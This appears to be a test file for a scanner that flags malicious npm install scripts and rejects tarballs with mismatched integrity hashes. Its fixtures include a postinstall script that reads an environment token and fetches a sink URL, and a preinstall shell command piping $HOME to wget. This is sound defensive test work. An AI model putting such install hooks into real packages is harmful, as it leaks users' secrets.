import assert from "node:assert/strict";
import { createHash } from "node:crypto";
import { test } from "node:test";
import { downloadTarball, scanStatic } from "./staticScripts.ts";
import { packFixture } from "./testSupport.ts";

function requestFor(version: string, tarball: Buffer) {
  return {
    name: "@bulkheaddemo/colorkit",
    version,
    tarballUrl: `http://localhost:4873/colorkit-${version}.tgz`,
    integrity: `sha512-${createHash("sha512").update(tarball).digest("base64")}`,
    publishedAt: "2026-11-06T10:00:00.000Z",
  };
}

const cleanManifest = JSON.stringify({ name: "@bulkheaddemo/colorkit", version: "1.4.0", main: "index.js" });
const poisonedManifest = JSON.stringify({
  name: "@bulkheaddemo/colorkit",
  version: "1.4.1",
  scripts: { postinstall: "node postinstall.js", test: "curl example" },
});
const poisonedScript = "const token = process.env.CANARY_TOKEN; await fetch(process.env.CANARY_SINK_URL);";

test("a version without install scripts passes", async () => {
  const tarball = await packFixture({ "package.json": cleanManifest, "index.js": "export const red = 1;" });
  const evidence = await scanStatic(requestFor("1.4.0", tarball), tarball);
  assert.equal(evidence.malicious, false);
  assert.deepEqual(evidence.findings, []);
  assert.equal(evidence.simulated, true);
});

test("a postinstall whose called file reads env and touches the network is flagged", async () => {
  const tarball = await packFixture({ "package.json": poisonedManifest, "postinstall.js": poisonedScript });
  const evidence = await scanStatic(requestFor("1.4.1", tarball), tarball);
  assert.equal(evidence.malicious, true);
  assert.deepEqual(
    evidence.findings.map(({ rule, file }) => `${rule}:${file}`).sort(),
    ["installScriptEnv:postinstall.js", "installScriptNetwork:postinstall.js"],
  );
});

test("a shell install command that exports a variable is flagged on the command itself", async () => {
  const manifest = JSON.stringify({ name: "x", version: "1.0.0", scripts: { preinstall: "sh -c 'echo $HOME | wget -q -'" } });
  const tarball = await packFixture({ "package.json": manifest });
  const evidence = await scanStatic(requestFor("1.0.0", tarball), tarball);
  assert.deepEqual(
    evidence.findings.map(({ rule }) => rule).sort(),
    ["installScriptEnv", "installScriptNetwork", "installScriptShell"],
  );
  assert.ok(evidence.findings.every(({ file }) => file === "package.json"));
});

test("non lifecycle scripts are ignored", async () => {
  const manifest = JSON.stringify({ name: "x", version: "1.0.0", scripts: { test: "curl http://example.com", build: "sh build.sh" } });
  const tarball = await packFixture({ "package.json": manifest });
  assert.equal((await scanStatic(requestFor("1.0.0", tarball), tarball)).malicious, false);
});

test("download rejects a tarball whose integrity does not match", async () => {
  const tarball = await packFixture({ "package.json": cleanManifest });
  const fakeFetch = async () => new Response(new Uint8Array(tarball));
  const { tarballUrl, integrity } = requestFor("1.4.0", tarball);
  assert.deepEqual(await downloadTarball(tarballUrl, integrity, fakeFetch), tarball);
  await assert.rejects(downloadTarball(tarballUrl, "sha512-AAAA", fakeFetch), /integrity mismatch/);
  await assert.rejects(
    downloadTarball(tarballUrl, integrity, async () => new Response("gone", { status: 404 })),
    /status 404/,
  );
});
